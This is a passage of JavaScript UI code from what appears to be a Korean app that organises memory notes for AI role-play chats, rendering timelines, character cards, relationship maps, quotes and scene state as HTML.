      + '<div class="bd-write"><input type="text" data-out="lvMsg" maxlength="120" placeholder="같이 달리기…" autocomplete="off"' + (lvTyping ? ' disabled' : '') + '><button class="btn sm pri" data-act="lvsend"' + (lvTyping ? ' disabled' : '') + '>전송</button></div><p class="lv-hint">그만 볼 땐 위 <b>⏸ 멈춤</b>을 꼭 눌러 주세요 · 채팅이 계속 흐르는 동안 AI를 불러요</p>';
    setTimeout(() => { const c = out('lvChat'); if (c) c.scrollTop = c.scrollHeight; }, 30);
    return head + genCard() + '<div class="bd">' + tv + epTabs + box + nextCard + '<p class="bd-snap"><button class="linkbtn" data-act="bdimg" data-arg="home">이미지로 저장</button></p></div>' + etcFoot(liveData, '실시간톡', 'lvrange', '', 'live') + sheet;
  }
  // ── 타임라인: 날짜로그를 날짜순 세로 줄로. 위에서 인물을 고르면 그 사람이 나온 일만 ──
  //    "태정"처럼 이름 끝 두 글자로만 불러도 (그 이름이 이 사람에게만 맞으면) 같은 사람으로 찾습니다.
  // CANON이 비어 있어도(예전 형식 노트 등) 인물 목록에서 직접 "딱 이 사람에게만 맞는지" 확인합니다
  let _poolKey = null, _poolVal = [];
  const namePool = () => { if (CANON.length) return CANON; const k = bodyOf('인물'); if (k !== _poolKey) { _poolKey = k; try { _poolVal = [...people().keys()]; } catch (_) { _poolVal = []; } } return _poolVal; };
  // 【루루】 … 별명 온윤아 · 가명 ○○ → 이 사람의 다른 이름. 이야기 속에서 새 이름(조선 이름 등)을 얻어도 같은 사람으로.
  const ALT_RE = /(?:별명|가명|본명|새 이름|다른 이름|개명)\s*[:：]?\s*([^\s·,()（）「」]{2,20})/g;
  let _altKey = null, _altVal = new Map();
  const altNames = () => { const body = bodyOf('인물'); if (body !== _altKey) { _altKey = body; _altVal = new Map();
      for (const l of String(body).split('\n')) { const h = l.trim().match(/^【(.+?)】(.*)$/); if (!h) continue; const alts = [...h[2].matchAll(ALT_RE)].map(m => m[1]); if (alts.length) _altVal.set(h[1].trim(), alts); } }
    return _altVal; };
  const personAlias = name => { const out = new Set([name, ...(altNames().get(name) || [])]), pool = namePool();
    // 이름 조각(영어 이름 포함)·이름 한 토막·뒤 두 글자로도 부르니까, 딱 이 사람에게만 맞을 때 별명으로 칩니다
    for (const f of nameForms(name)) { out.add(f); const cand = [...f.split(/\s+/).filter(t => [...t].length >= 2), ...([...f].length >= 3 && /[가-힣]/.test(f) ? [[...f].slice(-2).join('')] : [])];
      for (const c of cand) if (sameName(name, c) && !pool.some(n => n !== name && sameName(n, c))) out.add(c); }
    return [...out]; };
  function timelineHtml() {
    if (!snapshot?.note) return emptyBox('아직 정리한 기억이 없어요.');
    const names = [...people().keys()], who = nav.tlWho && names.includes(nav.tlWho) ? nav.tlWho : null;
    const al = who ? personAlias(who) : [];
    // 글에 이름·별명이 있거나, 영어 이름(대문자로 시작하는 단어)이 그 사람 이름과 발음이 같으면 그 사람 이야기로 봅니다
    const has = t => { t = String(t || ''); if (al.some(a => t.includes(a))) return true; const w = t.match(/\b[A-Z][a-z'-]{2,}/g); return !!w && w.some(x => crossName(x, who)); };
    // 인물을 고르면 그 사람이 나오는 사건을 한 목록에 시간순으로 모두 보여줍니다.
    //   제목에 가장 먼저 나오는 인물이 주인공이고, 다른 사람이 주인공인 사건은 "나옴"으로 흐리게, 내용은 이 사람 이름이 든 줄(이 사람이 한 일)만 보여줍니다.
    const aliasOf = new Map(names.map(n => [n, personAlias(n)]));
    const subjOf = t => { t = String(t || ''); let best = '', at = 1e9; for (const [n, als] of aliasOf) for (const a of als) { const i = t.indexOf(a); if (i >= 0 && i < at) { at = i; best = n; } } return best; };
    const isSide = e => { const sj = who && subjOf(e.title); return !!sj && sj !== who; };
    const evsAll = blocksOf(bodyOf('날짜로그')).map(b => {
      const packed = /\(요약\)/.test(b.title || ''), m = (b.title || '').replace(/\s*\(요약\)\s*$/, '').match(/^\[?([^\]\-]+?)\s*-\s*(.+?)\]?$/);
      const q = b.lines.find(l => /^근거\s*[:：]/.test(l));
      return { date: m ? m[1].trim() : '', title: m ? m[2].trim() : (b.title || '사건').replace(/^\[|\]$/g, ''), packed, lines: b.lines.filter(notProofLine),
        quote: q ? q.replace(/^근거\s*[:：]\s*/, '').replace(/^["“]|["”]$/g, '') : '',
        // 나온 사람 = 제목·행동 줄에 이름이 있는 사람. "장소 · 그 자리 인물 나열" 줄과 근거 줄은 세지 않습니다(같은 파티에 있었을 뿐인 사람 X).
        all: (b.title || '') + ' ' + b.lines.filter(l => notProofLine(l) && !metaOf(l))
          .map(l => { const p = String(l).split(/\s+→\s+/); return p.length > 1 && metaOf(p[0]) ? p.slice(1).join(' → ') : l; }).join(' ') };
    });
    const evs = evsAll.filter(e => !who || has(e.all));
    const chips = `<div class="tl-who"><button data-act="tlwho" data-arg="" aria-pressed="${!who}"><span class="av tl-all">✦</span><small>전체</small></button>${names.map(n =>
      `<button data-act="tlwho" data-arg="${esc(n)}" aria-pressed="${n === who}">${avatar(n)}<small>${esc(n)}</small></button>`).join('')}</div>`;
    // 서사 고리는 여기 한 곳에만: 위엔 아직 끝나지 않은 일, 끝난 일은 접어서
    const th = threads().filter(t => !who || has(t.title) || has(t.text) || has(t.quote)), openTh = th.filter(t => !t.closed), doneTh = th.filter(t => t.closed);
    const thRow = t => { const m = String(t.title).match(/^(.{1,6}?)\s*[·:：]\s*(.+)$/);
      return `<div class="thr"><b>${m ? `<em class="thk">${esc(m[1])}</em>${esc(m[2])}` : esc(t.title)}</b>${bitsOf(t.text).map(bitHtml).join('')}${quoteHtml(t.quote, t.tr)}</div>`; };
    const upcoming = openTh.length || doneTh.length ? `<div class="tl-up"><div class="tl-up-h"><b>🪢 아직 끝나지 않은 일 ${openTh.length}</b><button class="linkbtn" data-act="edit" data-arg="서사 고리">고치기</button></div>
      ${openTh.map(thRow).join('') || '<p>지금은 없어요.</p>'}
      ${doneTh.length ? `<details class="tl-done"><summary>끝난 일 ${doneTh.length}</summary>${doneTh.map(thRow).join('')}</details>` : ''}</div>` : '';
    const mem = who ? (PROF.get(who)?.memories || []) : [];
    // 기억하는 일 중 같은 날짜 사건이 아래 목록에 있으면 거기 "💭 기억함"만 달고 여기선 뺍니다(같은 일을 두 번 X).
    //   (요약)으로 묶여 목록에서 사라진 일만 여기 남아요.
    const evDays = new Set(evs.filter(e => !e.packed).map(e => dayOf(e.date)).filter(Boolean));
    const memLeft = mem.filter(m => !evDays.has(dayOf(m))), memMark = new Set(mem.map(dayOf).filter(d => evDays.has(d)));
    const memHtml = memLeft.length ? `<div class="tl-mem"><b>💭 ${esc(josa(who, '이', '가'))} 기억하는 일</b><div class="pmem">${memRows(memLeft).join('')}</div></div>` : '';
    const memTag = e => memMark.has(dayOf(e.date)) ? ' · 💭 기억함' : '';
    const peopleIn = e => names.filter(n => personAlias(n).some(a => e.all.includes(a))).slice(0, 5);
    const sideN = evs.filter(isSide).length;
    // 남의 사건: 이 사람의 ⤿ 줄만. 없으면 이 사람 이름이 든 토막만(장소·"루루, 네이선 힐…" 같은 인물 나열은 빼고).
    const isSideLine = l => /^[⤿ㄴ↳]/.test(String(l).trim());
    const nameList = x => String(x).split(/[,，·]\s*/).every(p => !p.trim() || names.some(n => personAlias(n).some(a => p.includes(a))));
    const sideBody = e => { const own = e.lines.filter(l => isSideLine(l) && has(l));
      return own.length ? own.map(evBody).join('') : e.lines.filter(l => !isSideLine(l)).flatMap(l => String(l).split(/\s+→\s+/)).flatMap(bitsOf).filter(x => has(x) && !nameList(x)).map(bitHtml).join(''); };
    const evLi = e => isSide(e) ? `<li class="side">
        <span class="tl-date">${esc(e.date || '날짜 미상')} · ${esc(subjOf(e.title))} 사건에 나옴${memTag(e)}</span>
        <b class="tl-title">${esc(e.title)}</b>${sideBody(e)}<span class="tl-ppl">${peopleIn(e).map(n => avatar(n)).join('')}</span></li>` : `<li class="${e.packed ? 'old' : ''}">
        <span class="tl-date">${esc(e.date || '날짜 미상')}${e.packed ? ' · 줄여 둠' : ''}${memTag(e)}</span>
        <b class="tl-title">${esc(e.title)}</b>${e.lines.map(evBody).join('')}
        <span class="tl-ppl">${peopleIn(e).map(n => avatar(n)).join('')}</span>${quoteHtml(e.quote)}</li>`;
    // 사건이 많아지면(1000턴…) 최근 10개만 펼치고 예전 사건은 접어 둡니다.
    const RECENT = 10, olderEv = evs.slice(0, -RECENT), recentEv = evs.slice(-RECENT);
    const list = evs.length ? `${olderEv.length ? `<details class="tl-up tl-fold"><summary><b>예전 사건 ${olderEv.length}</b></summary><ol class="tline">${olderEv.map(evLi).join('')}</ol></details>` : ''}<ol class="tline">${recentEv.map(evLi).join('')}</ol>`
      : emptyBox(who ? `${esc(josa(who, '이', '가'))} 나온 사건이 아직 없어요.` : '아직 사건이 없어요.');
    const head = `<div class="sechead"><span>${who ? `${esc(who)} · ` : ''}사건 ${evs.length}개${sideN ? `(나옴 ${sideN})` : ''} · 오래된 일부터</span><button class="linkbtn" data-act="edit" data-arg="날짜로그">고치기</button></div>`;
    // 큰 흐름(줄거리)은 맨 위에 한 번. 인물을 고르면 그 사람 이야기만 보이니 숨깁니다.
    // AI가 한 문단으로 몰아 쓰면 문장마다 한 줄로 나눠 보여줍니다.
    const story = itemsOf(bodyOf('줄거리')).flatMap(l => l.length > 80 ? l.split(/(?<=[.!?。])\s+/).filter(Boolean) : [l]);
    const storyHtml = !who && story.length ? `<div class="tl-story"><div class="tl-up-h"><b>🧵 지금까지 큰 흐름</b><button class="linkbtn" data-act="edit" data-arg="줄거리">고치기</button></div>
      <ol class="story">${story.map(l => `<li>${esc(l)}</li>`).join('')}</ol></div>` : '';
    // 이정표: 이야기가 꺾인 순간들. 날짜로그가 (요약)으로 묶여도 남아요. 인물을 고르면 그 사람이 나온 것만.
    const miles = blocksOf(bodyOf('이정표')).filter(b => b.title && (!who || has(b.title + ' ' + b.lines.join(' '))));
    const milesHtml = miles.length ? `<details class="tl-up tl-fold"><summary><b>🚩 이정표 ${miles.length}</b><button class="linkbtn" data-act="edit" data-arg="이정표">고치기</button></summary>
      ${miles.map(b => { const m = b.title.replace(/^\[|\]$/g, '').match(/^([^\]\-]+?)\s*-\s*(.+)$/);
        return `<div class="thr"><b>${m ? `<em class="thk">${esc(m[1].trim())}</em>${esc(m[2])}` : esc(b.title)}</b>${b.lines.filter(notProofLine).map(l => `<p class="pnt">${esc(l)}</p>`).join('')}</div>`; }).join('')}</details>` : '';
    // 세계관 · 명대사도 여기 한 곳에 (접어 두고 필요할 때 펼침). 인물을 고르면 그 사람 대사만.
    const world = blocksOf(bodyOf('세계관'));
    const worldHtml = !who ? `<details class="tl-up tl-fold"><summary><b>🌍 세계관 ${world.reduce((a, b) => a + b.lines.length + (b.title ? 1 : 0), 0)}</b><button class="linkbtn" data-act="edit" data-arg="세계관">고치기</button></summary>
      ${world.map(b => `${b.title ? `<p><span>${esc(b.title)}</span></p>` : ''}${b.lines.filter(notProofLine).map(l => `<p>${esc(l)}</p>`).join('')}`).join('') || '<p>아직 정리된 세계관이 없어요. 원문에서 설정·규칙이 확인되면 정리할 때 여기에 쌓여요.</p>'}</details>` : '';
    const qHtml = quoteFold(who);
    return descHtml('timeline') + chips + storyHtml + milesHtml + worldHtml + upcoming + memHtml + head + list + qHtml;
  }
  function quoteFold(who, open) {
    const qs = quotes().map((q, i) => ({ ...q, i })).filter(q => !who || q.who === who || sameName(q.who, who));
    return `<details class="tl-up tl-fold tl-quotes"${open || nav.qOpen || nav.rgKind === 'quote' ? ' open' : ''}><summary><b>✨ ${who ? `${esc(josa(who, '이', '가'))} 한 ` : ''}명대사 ${qs.length}</b><button class="qplus" data-act="qmake" data-arg="${esc(who || '')}" title="대화에서 명대사 고르기"${busyNow ? ' disabled' : ''}>${busyNow ? '…' : '<svg viewBox="0 0 12 12" aria-hidden="true"><path d="M6 1v10M1 6h10"/></svg>'}</button></summary>
      ${qs.map(q => { const [orig, inl] = splitTr(q.text), tr = q.tr || inl; return `<div class="tl-q"><button class="tl-qx" data-act="qdel" data-arg="${q.i}" title="이 대사 지우기">×</button><p class="tl-qt">"${esc(orig)}"</p>${tr ? `<p class="tl-qs">${esc(tr)}</p>` : ''}<p class="tl-qs">${q.who && !who ? `${esc(q.who)}${q.to ? ` → ${esc(q.to)}` : ''} · ` : q.to ? `→ ${esc(q.to)} · ` : ''}${q.ctx ? `🎬 ${esc(q.ctx)}` : ''}</p></div>`; }).join('')}
      ${qs.length ? '' : '<p>오른쪽 ＋를 누르면 고른 턴의 대화에서 골라 와요. 다시 누르면 기존 대사 뒤에 더해져요.</p>'}</details>${nav.bdRange && nav.rgKind === 'quote' ? rangeSheet('명대사 뽑기') : ''}`;
  }

  // 칸마다 맨 위 한 줄 안내. 무엇을 담는지 · 어떻게 관리되는지 (명사형)
  const DESC = {
    '줄거리': '처음부터 지금까지 큰 흐름 3~6줄 · 마지막 줄은 지금 향하는 방향',
    '이정표': '이야기가 꺾인 순간 · 전 → 후 · 지금도 남은 흔적 · 날짜로그가 묶여도 남음 · 최대 20개',
    '날짜로그': '사건별 기록 · 원인 → 행동 → 결과 · 날짜는 연도까지 · 노트가 커지면 오래된 사건부터 (요약) 묶음',
    phone: '인물마다 폰·컴퓨터 속 구경 · 노트의 성격·말투·관계에 맞춰 AI가 꾸민 팬 콘텐츠 · 기억 노트·채팅엔 들어가지 않음',
    timeline: '큰 흐름 · 세계관 · 명대사 · 날짜순 사건을 한 줄로 · 얼굴을 누르면 그 사람 이야기만 · 원문에 나온 일만 기록(근거 버튼으로 확인)',
    '서사 고리': '아직 안 끝난 약속·계획·복선·갈등 · 끝나면 날짜로그로 이동',
    '명대사': '상대 캐릭터 대사 원문 그대로 · 번역·장면 함께 · 최대 15개 · 버튼을 눌렀을 때만 뽑음 · 화면 확인용(채팅 노트엔 미포함)',
    '세계관': '원문에서 확인된 설정·규칙 · 한 번 확인되면 계속 유지',
    [FIXED]: '직접 쓰는 절대 기준 · AI 수정 없음 · 모든 칸이 이 기준을 따름',
    '현재상태': '정리 시점의 지금 값(장면·몸·옷차림·제약) · 이후 대화와 다르면 대화 우선',
    '소지품': '다시 나올 물건만 · 지금 주인·상태 + 입수→건넴→분실 내력 · 잃어버려도 삭제 없음',
    '장소·조직': '다시 찾을 장소·조직만 · 위치·드나드는 조건·지금 상태',
    list: '잘 안 바뀌는 것(정체·성격·말버릇) · 새 대화에 안 나온 인물도 그대로 유지',
    map: '서로 어떻게 보는지 · 방향마다 한 줄 · 바뀐 계기는 (변화: …)',
    speech: '누가 누구를 뭐라 부르는지 · 존댓말·반말 · 이름을 눌러 펼치기',
    know: `정보 하나 = 칸 하나 · 인물마다 ${KNOW.join('·')} 중 하나 · 숨김은 누가 누구에게 · 모르는 비밀을 아는 척하는 사고 방지`,
    feel: '방향별 감정 변화 기록 · 날짜·계기·자각 · ★ = 큰 전환점 · 채팅 노트에도 들어감(폰↔컴 어디서 정리해도 이어짐)',
  };
  const descHtml = k => DESC[k] ? `<p class="secdesc">${esc(DESC[k])}</p>` : '';

  // ── 현재상태: 장면 카드 하나 + 인물별 카드(몸 상태 · 옷차림) + 제약 + 그 밖의 소제목
  function nowHtml(body, li) {
    const bl = blocksOf(body);
    const pick = re => bl.filter(b => re.test(b.title || ''));
    const scene = pick(/시점|장소|기준/).flatMap(b => b.lines);
    const bodyRows = pick(/몸/).flatMap(b => b.lines).filter(l => !/^(근거|번역)\s*[:：]/.test(l));
    const rules = pick(/제약|약속|조건/).flatMap(b => b.lines).filter(l => !/^(근거|번역)\s*[:：]/.test(l));
    const rest = bl.filter(b => !/시점|장소|기준|몸|제약|약속|조건|옷차림|복장|의상|소지품/.test(b.title || ''));
    // 사람마다: "이름: 내용" 줄을 모아 한 카드로
    const byName = new Map(), add = (nm, k, v) => { nm = canon(nm); if (!byName.has(nm)) byName.set(nm, {}); byName.get(nm)[k] = v; };
    for (const l of bodyRows) { const i = labelCut(l); if (i > 0) add(l.slice(0, i), 'body', l.slice(i + 1).trim()); }
    for (const w of outfits()) add(w.name, 'wear', w);
    const order = [...people().keys()], names = [...byName.keys()].sort((a, b) => (order.indexOf(a) + 999) % 999 - (order.indexOf(b) + 999) % 999);
    const sceneRows = (() => {
      // 자리 순서가 아니라 내용으로 나눕니다: 날짜·시각 → 때, 인물 이름 → 함께, 나머지 → 곳 (AI가 쉼표·가운뎃점을 섞어 써도 안 밀리게)
      const parts = String(scene[0] || '').split(/\s*[·,，]\s*/).map(x => x.trim()).filter(Boolean);
      const isWho = x => x.length <= 16 && [...people().keys()].some(n => n === x || personAlias(n).includes(x)), isTime = x => /^\d|^(?:\d+년차)|[자축인묘진사오미신유술해]시|^(아침|낮|오후|오전|저녁|밤|새벽)/.test(x);
      const when = parts.filter(x => isTime(x) && !isWho(x)), who = parts.filter(isWho), where = parts.filter(x => !when.includes(x) && !who.includes(x));
      const row = (k, v) => v ? `<div class="scl"><span>${k}</span><b>${esc(v)}</b></div>` : '';
      const main = parts.length > 1 ? row('때', when.join(' ')) + row('곳', where.join(', ')) + row('함께', who.join(', ')) : `<div class="scl"><span>장면</span><b>${esc(parts[0] || '')}</b></div>`;
      return main + scene.slice(1).map((l, i) => `<p class="scm">⤷ ${esc(l)}</p>`).join('');
    })();
    const sceneHtml = scene.length ? `<section class="scene"><span class="scene-k">📍 지금 장면</span>${sceneRows}</section>` : '';
    // 인물 카드는 늘 펼쳐 둡니다. 이름 줄을 누르면 인물 화면.
    const cards = names.map(nm => { const x = byName.get(nm), [bg, fg] = avColor(nm);
      return `<section class="ncard" style="--nb:${bg};--nf:${fg}"><button class="ncard-h" data-act="person" data-arg="${esc(nm)}">${avatar(nm)}<span class="ncard-t"><b>${esc(nm)}</b>${PROF.get(nm)?.tag ? `<small>${esc(PROF.get(nm).tag)}</small>` : ''}</span></button>
        ${x.body ? `<div class="nrow"><span class="nk">🩹 몸</span><span class="nv">${bitsOf(x.body).map(bitHtml).join('')}</span></div>` : ''}
        ${x.wear ? `<div class="nrow"><span class="nk">👗 옷</span><span class="nv">${wearHtml(x.wear.text)}${quoteHtml(x.wear.quote, x.wear.tr)}</span></div>` : ''}</section>`; }).join('');
    const ruleKind = l => { const m = l.match(/^(약속|제약|조건|금지|기한|합의|규칙)\s*[:：]\s*(.+)$/); if (m) return [m[1], m[2]];
      return [/금지|못 ?함|안 ?됨|불가|하지 못/.test(l) ? '금지' : /약속|기로 ?함|합의/.test(l) ? '약속' : /까지|전까지/.test(l) ? '기한' : '', l]; };
    // 약속·습관 한 줄: 앞에 동그라미 칩(금지 / 태정 → 서윤), 뒤에 "(마지막으로 나온 날)"은 흐리게, 바로 아래 근거 줄은 ⤷ 근거로
    const chipRows = (lines, kind) => { const out = [];
      for (const l of lines) { const q = l.match(/^근거\s*[:：]\s*(.*)$/);
        if (q) { if (out.length) out[out.length - 1].q = q[1]; continue; }
        if (!/^번역\s*[:：]/.test(l)) out.push({ l }); }
      return out.map(({ l, q }) => { const who = l.match(/^(.+?)\s*(?:→|->)\s*(.+?)\s*[:：]\s*(.+)$/), [k, t0] = who ? ['', who[3]] : kind(l);
        const last = t0.match(/\s*\((?:마지막으로 나온 날|최근 확인)\s*[:：]\s*([^)]*)\)\s*$/), t = last ? t0.slice(0, last.index) : t0;
        return `<li>${who ? `${nameChip(canon(who[1]))}<i class="nar">→</i>${nameChip(canon(who[2]))} ` : ''}${k ? `<em class="rk">${esc(k)}</em>` : ''}${esc(t)}${last ? ` <small class="pdim">${esc(last[1])}</small>` : ''}${quoteHtml(q)}</li>`; }).join(''); };
    const ruleLines = pick(/제약|약속|조건/).flatMap(b => b.lines), habitLines = pick(/습관|생활의 결/).flatMap(b => b.lines);
    const rulesHtml = rules.length ? `<div class="st-card"><div class="st-h">⏳ 약속 · 금지 · 조건</div><ul class="nrules">${chipRows(ruleLines, ruleKind)}</ul></div>` : '';
    const habitsHtml = habitLines.length ? `<div class="st-card"><div class="st-h">🔁 되풀이되는 습관</div><ul class="nrules">${chipRows(habitLines, l => ['', l])}</ul></div>` : '';
    // 둘만의 것: 첫 줄 "A와 B: 「푸들」 (날짜부터)" → 이름 칩 + 굵은 무엇 + 흐린 날짜, 아래 "ㄴ 이름: 뜻"은 ⤷ 한 줄씩.
    //   예전 모양("— 긴 설명 (처음 뜻이 생긴 날: 날짜-사건 제목)")도 날짜만 남기고 설명은 아래 줄로 내립니다.
    const bondHtml = lines => { const out = [];
      for (const l of lines) {
        const q = l.match(/^근거\s*[:：]\s*(.*)$/); if (q) { if (out.length) out[out.length - 1].q = q[1]; continue; }
        if (/^번역\s*[:：]/.test(l)) continue;
        const sub = l.match(/^[ㄴ⤷⤿↳]\s*(.+)$/); if (sub) { if (out.length) out[out.length - 1].subs.push(sub[1]); continue; }
        const m = l.match(/^(.+?)[와과]\s+(.+?)\s*[:：]\s*(.+)$/), body = m ? m[3] : l;
        const dm = body.match(/\s*\((?:처음 뜻이 생긴 날\s*[:：]\s*)?([^)]*?)(?:부터)?\)\s*$/), day = dm ? (dayOf(dm[1]) || dm[1]) : '';
        const rest = dm ? body.slice(0, dm.index) : body, [what, ...why] = rest.split(/\s+[—–]\s+/);
        out.push({ a: m && m[1], b: m && m[2], what: what.trim(), day, subs: why.length ? [why.join(' — ')] : [], q: '' }); }
      return out.map(x => `<li>${x.a ? `${nameChip(canon(x.a))}<i class="nar">·</i>${nameChip(canon(x.b))} ` : ''}<b>${esc(x.what)}</b>${x.day ? ` <small class="pdim">${esc(x.day)}</small>` : ''}${x.subs.map(t => `<p class="pnt">${esc(t)}</p>`).join('')}${quoteHtml(x.q)}</li>`).join(''); };
    const bondLines = pick(/둘만의 것/).flatMap(b => b.lines);
    const bondsHtml = bondLines.length ? `<div class="st-card"><div class="st-h">🎀 둘만의 것</div><ul class="nrules">${bondHtml(bondLines)}</ul></div>` : '';
    const restHtml = rest.filter(b => !/습관|생활의 결|둘만의 것/.test(b.title || '')).map(b => blkHtml(b, li)).join('');
    // 순서: 지금 장면 → 지금 사람들(몸·옷) → 약속 → 습관 → 둘만의 것 → 나머지. 지금 상황부터 먼저 보이게.
    return sceneHtml + (cards ? `<div class="h3">👥 지금 사람들</div>${cards}` : '') + rulesHtml + habitsHtml + bondsHtml + restHtml || emptyBox('아직 내용이 없어요.');
  }

  // ── 인물 ──
  function peopleHtml(forced = null, segOverride = null) {
    const which = forced || nav.ppl;
    if (!snapshot?.note) return emptyBox('아직 정리한 기억이 없어요.');
    const seg = segOverride ?? `<div class="seg">${PEOPLE_TABS.map(([k, l]) => `<button data-act="ppl" data-arg="${k}" aria-pressed="${k === which}">${l}</button>`).join('')}</div>`;
    if (which === 'feel') {
      const fl = feelings();
      const stepLi = (st, now) => `<li class="${now ? 'now' : ''}${st.star ? ' turn' : ''}">
            <span class="fd">${st.star ? '<em class="ft">전환점</em>' : ''}${esc(st.date)}</span>
            <b class="ff">${esc(st.feel)}</b>${st.aware ? `<span class="fa${/^자각/.test(st.aware) ? ' on' : ''}">${esc(AWARE[st.aware.replace(/\(.*$/, '').trim()] || st.aware)}</span>` : ''}
            ${st.why ? `<span class="fw">${esc(st.why)}</span>` : ''}${quoteHtml(st.quote, st.tr)}</li>`;
      // 단계가 6개를 넘으면 처음 · ★ 전환점 · 최근 3단계만 펼치고, 그 사이 단계는 "중간 단계 N개"로 접습니다(지우지 않음, 누르면 보임).
      const stepsHtml = steps => {
        const keep = (st, i) => steps.length <= 6 || i === 0 || st.star || i >= steps.length - 3;
        let out = '', hid = [];
        const flush = () => { if (hid.length) out += `<li class="fmid"><details><summary>중간 단계 ${hid.length}개</summary><ol class="feel">${hid.join('')}</ol></details></li>`; hid = []; };
        steps.forEach((st, i) => { const li = stepLi(st, i === steps.length - 1); if (keep(st, i)) { flush(); out += li; } else hid.push(li); });
        flush(); return out;
      };
      return seg + descHtml('feel') + `<div class="meta"><span>${fl.length}개 방향</span>${editBtn('감정선')}</div>` +
        (fl.length ? fl.map(x => itemHtml(`${esc(x.from)} <i class="arr">→</i> ${esc(x.to)}`,
          `<ol class="feel" style="--fc:${avColor(x.from)[1]};--fb:${avColor(x.from)[0]}">${stepsHtml(x.steps)}</ol>`)).join('')
          : emptyBox('감정이 바뀌는 순간이 생기면 여기에 쌓여요.'));
    }
    if (which === 'know') {
      const fs = facts();
      return seg + descHtml('know') + `<div class="meta"><span>정보 ${fs.length}개 · 눌러서 펼치기</span>${editBtn('인지·비밀')}</div>` +
        (fs.length ? fs.map(f => fold(`<b>${esc(f.title)}</b>`, f.content || f.who.map(x => `${x.name} ${x.state}`).join(' · '), (f.content ? `<p class="item-sub" style="margin:0 0 8px">${esc(f.content)}</p>` : '') + factBody(f))).join('') : emptyBox('숨기거나 모르는 정보가 생기면 여기에 정리돼요.'));
    }
    if (which === 'speech') {
      const sp = pairs('호칭·말투');
      // 부르는 사람별로 접었다 펴기. 펼치면 "→ 상대 「호칭」 말투" 한 줄씩
      const who = [...new Set(sp.map(x => x.from))];
      return seg + descHtml('speech') + `<div class="meta"><span>${who.length}명</span>${editBtn('호칭·말투')}</div>` +
        (who.length ? who.map(nm => { const rows = sp.filter(x => x.from === nm);
          return `<details class="spgrp"><summary>${avatar(nm)}<b>${esc(nm)}</b><span>${rows.length}명</span></summary>${rows.map(x => { const c = speechChips(x.text);
            return `<div class="sprow"><span class="spto">${esc(josa(x.to, '을', '를'))} 부를 때</span>${addrHtml(c)}${regTag(c)}${c.extra ? `<p class="item-sub">${esc(c.extra)}</p>` : ''}</div>`; }).join('')}</details>`; }).join('')
          : emptyBox('호칭·말투 정보가 없어요.'));
    }
    if (which === 'outfit') {
      const worn = outfits(), names = [...people().keys()], none = names.filter(x => !worn.some(w => w.name === x));
      return seg + `<div class="meta"><span>${snapshot.note.turns}턴 시점의 옷차림</span>${editBtn('현재상태')}</div>` +
        (worn.length ? worn.map(x => itemHtml(esc(x.name), wearHtml(x.text) + quoteHtml(x.quote, x.tr))).join('') : emptyBox('옷차림이 언급되면 인물마다 여기에 정리돼요.')) +
        (none.length ? `<p class="muted" style="margin-top:12px">옷차림 언급 없음 · ${none.map(esc).join(', ')}</p>` : '');
    }
    const ppl = people();
    if (which === 'list') {
      return seg + descHtml('list') + `<div class="meta"><span>${ppl.size}명</span>${editBtn('인물')}</div>` +
        (ppl.size > 5 ? `<label class="search">${icon('eye', 'var(--mute)', 16).replace(ICON.eye, '<circle cx="11" cy="11" r="6"/><path d="M16 16l4 4"/>')}<input type="search" data-out="psearch" placeholder="이름이나 설명으로 찾기" autocomplete="off"></label>` : '') +
        (ppl.size ? `<div class="list">${[...ppl].map(([nm, d]) => `<button class="pcard" data-find="${esc((nm + ' ' + (d || '')).toLowerCase())}" data-act="person" data-arg="${esc(nm)}">${avatar(nm)}<span class="t"><b>${esc(nm)}</b><small>${esc(d || '설명 없음')}</small></span>${icon('chev', 'var(--mute2)', 16)}</button>`).join('')}</div>` : emptyBox('인물 정보가 없어요.'));
    }
    // 관계도
    const rel = pairs('관계·감정선'), names = [...ppl.keys()];
    rel.forEach(r => { if (!names.includes(r.from)) names.push(r.from); if (!names.includes(r.to)) names.push(r.to); });
    const nb = new Map(names.map(x => [x, new Set()]));
    rel.forEach(r => { nb.get(r.from).add(r.to); nb.get(r.to).add(r.from); });
    const ranked = [...names].sort((a, b) => nb.get(b).size - nb.get(a).size);
    const rootName = names.includes(nav.center) ? nav.center : ranked[0];
    const pt = (a, b) => rel.filter(r => r.from === a && r.to === b).map(r => r.text).join(' · ');
    if (!rootName || !rel.length) return seg + emptyBox('관계·감정선이 정리되면 관계도가 그려져요.');
    // 고른 사람이 아직 누구와도 이어져 있지 않아도 관계도를 지우지 않고, 다른 사람을 고를 수 있게 둡니다.
    if (!nb.get(rootName).size) {
      const bar = `<div class="centers">${ranked.map(x => `<button data-act="center" data-arg="${esc(x)}" aria-pressed="${x === rootName}">${esc(x)}</button>`).join('')}</div>`;
      return seg + `<div class="meta"><span>${names.length}명 · 위에서 중심 인물을 바꿀 수 있어요</span>${editBtn('관계·감정선')}</div>${bar}
        <div class="rcenter">${avatar(rootName)}<div><b>${esc(rootName)}</b><small>${esc(ppl.get(rootName) || '')}</small></div></div>
        <p class="muted" style="margin-top:12px">${esc(rootName)}은(는) 아직 다른 인물과 이어진 관계가 정리되지 않았어요. 위에서 다른 사람을 골라 보세요.</p>`;
    }
    const seen = new Set([rootName]), kids = [...nb.get(rootName)];
    kids.forEach(k => seen.add(k));
    const branch = k => {
      const d = pt(rootName, k), u = pt(k, rootName), grand = [...nb.get(k)].filter(g => !seen.has(g));
      grand.forEach(g => seen.add(g));
      return `<div class="branch"><div class="stub"></div>
        <div class="edge">${d ? `<div><i>↓ ${esc(josa(rootName, '이', '가'))} 보기엔</i>${esc(d)}</div>` : ''}${u ? `<div><i>↑ ${esc(josa(k, '이', '가'))} 보기엔</i>${esc(u)}</div>` : ''}</div>
        <button class="tnode" data-act="person" data-arg="${esc(k)}">${avatar(k)}<b>${esc(k)}</b>${ppl.get(k) ? `<small>${esc(ppl.get(k))}</small>` : ''}</button>
        ${grand.length ? `<div class="subs">${grand.map(g => `<button data-act="person" data-arg="${esc(g)}">└ <b>${esc(g)}</b> ${esc((pt(k, g) || pt(g, k)).slice(0, 28))}</button>`).join('')}</div>` : ''}</div>`;
    };
    const bigBtn = `<button class="bigmap" data-act="graph">${icon('globe', 'currentColor', 16)}전체 관계도 크게 보기 · 확대해서 한눈에</button>`;
    const centerBar = names.length > 2 ? `<div class="centers">${ranked.map(x => `<button data-act="center" data-arg="${esc(x)}" aria-pressed="${x === rootName}">${esc(x)}</button>`).join('')}</div>` : '';
    // 연결된 사람이 많으면 가지 대신 한 줄씩 보여 줍니다.
    if (kids.length > 4) {
      const rows = kids.map(k => {
